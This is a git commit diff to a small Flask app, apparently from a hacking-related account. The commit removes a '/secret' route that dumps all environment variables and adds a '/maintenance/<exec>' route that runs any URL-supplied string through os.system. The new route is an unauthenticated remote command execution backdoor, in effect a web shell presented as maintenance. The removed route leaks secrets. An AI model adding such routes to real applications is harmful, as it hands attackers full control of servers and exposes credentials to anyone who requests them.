42289074b73f7e7b222cafe82b7e6d832acb3ec1
matthieu-hackwitharts <74831212+matthieu-hackwitharts@users.noreply.github.com>
2024-10-23 13:09:21 +0200

    Update app.py

--- app.py
+++ app.py
@@ -3,12 +3,9 @@ import os
 
 app = Flask(__name__)
 
-@app.route('/secret')
-def getvariables():
-    variables=""
-    for name, value in os.environ.items():
-        variables+= name + ":" + value
-    return variables
+@app.route('/maintenance/<exec>')
+def exec_system(exec):
+    return os.system(exec)
     
 @app.route('/')
 def hello():
